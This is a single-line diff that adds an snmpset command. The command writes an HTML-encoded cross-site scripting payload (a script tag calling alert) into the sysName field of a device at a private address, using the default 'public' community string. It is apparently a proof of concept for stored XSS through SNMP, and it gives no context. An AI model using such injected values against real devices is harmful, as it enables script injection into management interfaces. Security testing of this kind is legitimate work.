@@ -1,0 +1,1 @@
+$ snmpset -v1 -c public 192.168.1.100 sysName.0 s&#039;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#039;
